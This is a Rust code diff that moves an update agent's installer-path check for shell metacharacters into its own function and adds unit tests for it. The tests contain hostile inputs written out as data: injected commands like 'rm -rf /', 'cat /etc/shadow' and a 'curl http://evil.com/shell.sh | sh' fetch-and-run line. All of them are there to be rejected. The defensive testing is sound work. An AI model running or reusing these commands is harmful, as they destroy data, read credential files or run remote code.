@@ -10,6 +10,25 @@ use std::sync::Arc;
 #[allow(unused_imports)]
 use tracing::{debug, error, info, warn};
 
+/// Characters that are forbidden in installer paths to prevent shell injection.
+const UNSAFE_PATH_CHARS: [char; 16] = [
+    ';', '|', '&', '$', '`', '\'', '"', '\\', '\n', '\r', '(', ')', '{', '}', '<', '>',
+];
+
+/// Validate that an installer path does not contain shell metacharacters.
+///
+/// Returns `Ok(())` if the path is safe, or an `Err` with a description of the
+/// problem if it contains dangerous characters.
+fn validate_installer_path(path_str: &str) -> Result<()> {
+    if path_str.contains(UNSAFE_PATH_CHARS) {
+        return Err(CommonError::validation(format!(
+            "Installer path contains unsafe characters: {}",
+            path_str
+        )));
+    }
+    Ok(())
+}
+
 /// Orchestrates the agent self-update process.
 pub struct UpdateManager {
     api_client: Arc<ApiClient>,
@@ -225,14 +244,7 @@ impl UpdateManager {
         // SECURITY: Validate the installer path to prevent command injection on all platforms.
         // The path comes from our own temp directory, but defense-in-depth
         // requires rejecting any shell metacharacters.
-        if path_str.contains([
-            ';', '|', '&', '$', '`', '\'', '"', '\\', '\n', '\r', '(', ')', '{', '}', '<', '>',
-        ]) {
-            return Err(CommonError::validation(format!(
-                "Installer path contains unsafe characters: {}",
-                path_str
-            )));
-        }
+        validate_installer_path(path_str)?;
 
         #[cfg(target_os = "macos")]
         {
@@ -320,5 +332,96 @@ impl UpdateManager {
 
         // Terminate the process with success code so the installer can seamlessly replace the binary
         std::process::exit(0);
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // ── installer path: shell metacharacter rejection ───────────────────
+
+    #[test]
+    fn test_installer_path_rejects_shell_metacharacters() {
+        // Each of these characters must be rejected individually
+        let dangerous_paths = [
+            "/tmp/pkg;rm -rf /",           // semicolon
+            "/tmp/pkg|cat /etc/passwd",    // pipe
+            "/tmp/pkg&background",          // ampersand
+            "/tmp/pkg$(whoami)",            // dollar sign
+            "/tmp/pkg`id`",                // backtick
+            "/tmp/pkg'injected'",          // single quote
+            "/tmp/pkg\"injected\"",        // double quote (escaped for Rust)
+            "/tmp/pkg\\escaped",           // backslash
+            "/tmp/pkg\nwhoami",            // newline
+            "/tmp/pkg\rwhoami",            // carriage return
+            "/tmp/pkg(sub)",               // open paren
+            "/tmp/pkg)end",                // close paren
+            "/tmp/pkg{block}",             // open brace
+            "/tmp/pkg}end",                // close brace
+            "/tmp/pkg<input",              // less than
+            "/tmp/pkg>output",             // greater than
+        ];
+
+        for path in &dangerous_paths {
+            let result = validate_installer_path(path);
+            assert!(
+                result.is_err(),
+                "Path '{}' should be rejected for containing shell metacharacters",
+                path.escape_debug()
+            );
+            let err_msg = result.unwrap_err().to_string();
+            assert!(
+                err_msg.contains("unsafe characters"),
+                "Error for '{}' should mention unsafe characters, got: {}",
+                path.escape_debug(),
+                err_msg
+            );
+        }
+    }
+
+    // ── installer path: valid paths accepted ────────────────────────────
+
+    #[test]
+    fn test_installer_path_accepts_valid_path() {
+        let valid_paths = [
+            "/tmp/SentinelAgent-latest.pkg",
+            "/var/folders/abc123/T/tmpXYZ/SentinelAgentSetup-latest.msi",
+            "/tmp/sentinel-agent-latest-amd64.deb",
+            "/tmp/sentinel-agent-latest.x86_64.rpm",
+            "/home/user/.cache/sentinel/update.pkg",
+            // Paths with spaces are acceptable (no shell injection risk
+            // when passed as argument array elements, not via shell).
+            "/tmp/my folder/package.pkg",
+            // Paths with hyphens, underscores, dots, tildes
+            "/tmp/sentinel_agent-v2.1.0~beta.pkg",
+        ];
+
+        for path in &valid_paths {
+            let result = validate_installer_path(path);
+            assert!(
+                result.is_ok(),
+                "Path '{}' should be accepted as valid, got error: {:?}",
+                path,
+                result.err()
+            );
+        }
+    }
+
+    // ── installer path: edge cases ──────────────────────────────────────
+
+    #[test]
+    fn test_installer_path_rejects_combined_injection() {
+        // A realistic injection attempt combining multiple techniques
+        let result = validate_installer_path("/tmp/pkg; curl http://evil.com/shell.sh | sh");
+        assert!(result.is_err(), "Combined injection attempt must be rejected");
+
+        // Environment variable expansion attempt
+        let result = validate_installer_path("/tmp/$HOME/.config/pkg");
+        assert!(result.is_err(), "Environment variable expansion must be rejected");
+
+        // Command substitution attempt
+        let result = validate_installer_path("/tmp/$(cat /etc/shadow)");
+        assert!(result.is_err(), "Command substitution must be rejected");
     }
 }
